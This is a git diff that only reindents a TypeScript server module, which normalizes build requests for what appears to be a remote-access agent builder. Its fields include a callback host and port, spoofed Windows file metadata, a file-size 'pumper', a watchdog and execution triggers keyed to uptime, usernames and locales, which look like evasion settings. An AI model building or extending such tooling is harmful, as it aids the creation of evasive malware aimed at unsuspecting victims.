@@ -2,13 +2,13 @@ import { error } from '@sveltejs/kit';
 import { ZodError } from 'zod';
 import { agentModuleIds, agentModules } from '../../../../../shared/modules/index.js';
 import {
-        ALLOWED_EXTENSIONS_BY_OS,
-        TARGET_ARCHITECTURES_BY_OS,
-        TARGET_OS_VALUES,
-        type BuildRequest,
-        type TargetArch,
-        type TargetOS,
-        type WindowsFileInformation
+	ALLOWED_EXTENSIONS_BY_OS,
+	TARGET_ARCHITECTURES_BY_OS,
+	TARGET_OS_VALUES,
+	type BuildRequest,
+	type TargetArch,
+	type TargetOS,
+	type WindowsFileInformation
 } from '../../../../../shared/types/build';
 import { buildRequestSchema } from '$lib/validation/build-schema';
 
@@ -17,7 +17,7 @@ const architectureMatrix = new Map<TargetOS, Set<TargetArch>>(
 	TARGET_OS_VALUES.map((os) => [os, new Set(TARGET_ARCHITECTURES_BY_OS[os])])
 );
 const extensionMatrix = new Map<TargetOS, Set<string>>(
-        TARGET_OS_VALUES.map((os) => [os, new Set(ALLOWED_EXTENSIONS_BY_OS[os])])
+	TARGET_OS_VALUES.map((os) => [os, new Set(ALLOWED_EXTENSIONS_BY_OS[os])])
 );
 const moduleCatalog = new Set(agentModuleIds);
 const moduleOrder = new Map(agentModules.map((module, index) => [module.id, index]));
@@ -223,10 +223,10 @@ export function parseVersionParts(value: string | undefined): VersionParts | nul
 }
 
 export type NormalizedBuildRequest = {
-        host: string;
-        port: string;
-        targetOS: TargetOS;
-        targetArch: TargetArch;
+	host: string;
+	port: string;
+	targetOS: TargetOS;
+	targetArch: TargetArch;
 	outputExtension: string;
 	outputFilename: string;
 	installationPath: string;
@@ -244,28 +244,28 @@ export type NormalizedBuildRequest = {
 	audio: { streaming: NormalizedAudioStreaming };
 	watchdog: NormalizedWatchdog;
 	filePumper: NormalizedFilePumper;
-        executionTriggers: NormalizedExecutionTriggers;
-        customHeaders: NormalizedCustomHeader[];
-        customCookies: NormalizedCustomCookie[];
-        modules: string[];
-        raw: BuildRequest;
+	executionTriggers: NormalizedExecutionTriggers;
+	customHeaders: NormalizedCustomHeader[];
+	customCookies: NormalizedCustomCookie[];
+	modules: string[];
+	raw: BuildRequest;
 };
 
 export type NormalizedRuntimeConfig = {
-        watchdog?: { intervalSeconds: number };
-        filePumper?: { targetBytes: number };
-        executionTriggers?: {
-                delaySeconds?: number;
-                minUptimeMinutes?: number;
-                allowedUsernames?: string[];
-                allowedLocales?: string[];
-                requireInternet: boolean;
-                startTime?: string;
-                endTime?: string;
-        };
-        customHeaders?: NormalizedCustomHeader[];
-        customCookies?: NormalizedCustomCookie[];
-        modules?: string[];
+	watchdog?: { intervalSeconds: number };
+	filePumper?: { targetBytes: number };
+	executionTriggers?: {
+		delaySeconds?: number;
+		minUptimeMinutes?: number;
+		allowedUsernames?: string[];
+		allowedLocales?: string[];
+		requireInternet: boolean;
+		startTime?: string;
+		endTime?: string;
+	};
+	customHeaders?: NormalizedCustomHeader[];
+	customCookies?: NormalizedCustomCookie[];
+	modules?: string[];
 } | null;
 
 function formatZodError(err: ZodError): string {
@@ -278,9 +278,9 @@ function formatZodError(err: ZodError): string {
 }
 
 export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequest {
-        let parsed: BuildRequest;
-        try {
-                parsed = buildRequestSchema.parse(body);
+	let parsed: BuildRequest;
+	try {
+		parsed = buildRequestSchema.parse(body);
 	} catch (err) {
 		if (err instanceof ZodError) {
 			throw error(400, formatZodError(err));
@@ -344,15 +344,15 @@ export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequ
 
 	const watchdog = sanitizeWatchdog(parsed.watchdog ?? null);
 	const filePumper = sanitizeFilePumper(parsed.filePumper ?? null);
-        const executionTriggers = sanitizeExecutionTriggers(parsed.executionTriggers ?? null);
-        const customHeaders = sanitizeCustomHeaders(parsed.customHeaders ?? null);
-        const customCookies = sanitizeCustomCookies(parsed.customCookies ?? null);
-        const modules = sanitizeModules(parsed.modules);
+	const executionTriggers = sanitizeExecutionTriggers(parsed.executionTriggers ?? null);
+	const customHeaders = sanitizeCustomHeaders(parsed.customHeaders ?? null);
+	const customCookies = sanitizeCustomCookies(parsed.customCookies ?? null);
+	const modules = sanitizeModules(parsed.modules);
 
-        return {
-                host,
-                port,
-                targetOS,
+	return {
+		host,
+		port,
+		targetOS,
 		targetArch,
 		outputExtension,
 		outputFilename,
@@ -371,12 +371,12 @@ export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequ
 		audio: { streaming: normalizeAudioStreaming(parsed.audio) },
 		watchdog,
 		filePumper,
-                executionTriggers,
-                customHeaders,
-                customCookies,
-                modules,
-                raw: parsed
-        } satisfies NormalizedBuildRequest;
+		executionTriggers,
+		customHeaders,
+		customCookies,
+		modules,
+		raw: parsed
+	} satisfies NormalizedBuildRequest;
 }
 
 function clamp(value: number, min: number, max: number): number {
@@ -544,7 +544,7 @@ export function sanitizeCustomHeaders(
 }
 
 export function sanitizeCustomCookies(
-        payload: BuildRequest['customCookies'] | null | undefined
+	payload: BuildRequest['customCookies'] | null | undefined
 ): NormalizedCustomCookie[] {
 	if (!Array.isArray(payload) || payload.length === 0) {
 		return [];
@@ -568,40 +568,40 @@ export function sanitizeCustomCookies(
 }
 
 function sanitizeModules(payload: BuildRequest['modules'] | null | undefined): string[] {
-        if (!Array.isArray(payload)) {
-                return [];
-        }
+	if (!Array.isArray(payload)) {
+		return [];
+	}
 
-        const normalized: string[] = [];
-        const seen = new Set<string>();
+	const normalized: string[] = [];
+	const seen = new Set<string>();
 
-        for (const value of payload) {
-                if (typeof value !== 'string') {
-                        continue;
-                }
-                const trimmed = value.trim();
-                if (!trimmed || seen.has(trimmed) || !moduleCatalog.has(trimmed)) {
-                        continue;
-                }
-                seen.add(trimmed);
-                normalized.push(trimmed);
-        }
+	for (const value of payload) {
+		if (typeof value !== 'string') {
+			continue;
+		}
+		const trimmed = value.trim();
+		if (!trimmed || seen.has(trimmed) || !moduleCatalog.has(trimmed)) {
+			continue;
+		}
+		seen.add(trimmed);
+		normalized.push(trimmed);
+	}
 
-        if (normalized.length <= 1) {
-                return normalized;
-        }
+	if (normalized.length <= 1) {
+		return normalized;
+	}
 
-        return normalized.sort((a, b) => {
-                const indexA = moduleOrder.get(a) ?? Number.MAX_SAFE_INTEGER;
-                const indexB = moduleOrder.get(b) ?? Number.MAX_SAFE_INTEGER;
-                return indexA - indexB;
-        });
+	return normalized.sort((a, b) => {
+		const indexA = moduleOrder.get(a) ?? Number.MAX_SAFE_INTEGER;
+		const indexB = moduleOrder.get(b) ?? Number.MAX_SAFE_INTEGER;
+		return indexA - indexB;
+	});
 }
 
 export function buildRuntimeConfigPayload(
-        normalized: NormalizedBuildRequest
+	normalized: NormalizedBuildRequest
 ): NormalizedRuntimeConfig {
-        const payload: NonNullable<NormalizedRuntimeConfig> = {};
+	const payload: NonNullable<NormalizedRuntimeConfig> = {};
 
 	if (normalized.watchdog) {
 		payload.watchdog = { intervalSeconds: normalized.watchdog.intervalSeconds };
@@ -615,16 +615,16 @@ export function buildRuntimeConfigPayload(
 	if (normalized.customHeaders.length > 0) {
 		payload.customHeaders = normalized.customHeaders;
 	}
-        if (normalized.customCookies.length > 0) {
-                payload.customCookies = normalized.customCookies;
-        }
-        if (Array.isArray(normalized.raw.modules)) {
-                payload.modules = normalized.modules;
-        }
+	if (normalized.customCookies.length > 0) {
+		payload.customCookies = normalized.customCookies;
+	}
+	if (Array.isArray(normalized.raw.modules)) {
+		payload.modules = normalized.modules;
+	}
 
-        if (Object.keys(payload).length === 0) {
-                return null;
-        }
+	if (Object.keys(payload).length === 0) {
+		return null;
+	}
 	return payload;
 }
 
